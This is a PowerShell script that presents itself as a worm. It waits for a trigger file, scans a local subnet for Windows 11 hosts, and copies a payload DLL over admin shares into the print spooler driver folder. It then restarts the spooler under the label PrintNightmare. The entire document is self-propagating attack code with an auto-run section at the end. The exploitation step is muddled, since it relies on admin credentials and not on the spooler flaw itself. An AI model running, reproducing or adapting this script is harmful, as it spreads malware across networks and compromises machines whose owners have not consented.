
# Wait for signal trigger file (auto_chck.ps1)
$trigger = "C:\Windows\Temp\auto_chck.ps1"
while (-not (Test-Path $trigger)) {
    Start-Sleep -Seconds 3
}

# Function: Main worm logic to spread DLL via PrintNightmare
function Invoke-WormPrintNightmare {
    param (
        [string]$PayloadDllPath,
        [string]$SubnetPrefix = "192.168.1", # change this to match local network
        [PSCredential]$Credential
    )

    $infected = @{}

    foreach ($i in 1..254) {
        $target = "$SubnetPrefix.$i"

        if ($infected.ContainsKey($target)) { continue }

        if (Test-Connection -ComputerName $target -Count 1 -Quiet) {
            try {
                $os = Invoke-Command -ComputerName $target -Credential $Credential -ScriptBlock {
                    (Get-CimInstance Win32_OperatingSystem).Caption
                }

                if ($os -like "*Windows 11*") {
                    Write-Host "[*] Infecting $target..."
                    Invoke-PrintNightmare-Exploit -TargetHost $target -DllPath $PayloadDllPath -Credential $Credential
                    $infected[$target] = $true
                }
            } catch {
                Write-Warning "[-] $target - $_"
            }
        }
    }
}

# Function: PrintNightmare DLL dropper and trigger (remotely)
function Invoke-PrintNightmare-Exploit {
    param (
        [string]$TargetHost,
        [string]$DllPath,
        [PSCredential]$Credential
    )

    $remoteTemp = "\\$TargetHost\ADMIN$\Temp\payload.dll"
    Copy-Item -Path $DllPath -Destination $remoteTemp -Force -Credential $Credential

    $exploit = @"
\$dllPath = 'C:\\Windows\\Temp\\payload.dll'
\$source = '$remoteTemp'
Copy-Item -Path \$source -Destination \$dllPath -Force

\$driverDir = 'C:\\Windows\\System32\\spool\\drivers\\x64\\3\\'
\$targetDll = Join-Path \$driverDir 'payload.dll'
Copy-Item -Path \$dllPath -Destination \$targetDll -Force

Restart-Service spooler -Force
"@

    Invoke-Command -ComputerName $TargetHost -Credential $Credential -ScriptBlock {
        param($cmd)
        Invoke-Expression $cmd
    } -ArgumentList $exploit
}

# Auto-run
$payloadDll = "C:\Windows\Temp\payload.dll"
$creds = Get-Credential
Invoke-WormPrintNightmare -PayloadDllPath $payloadDll -Credential $creds
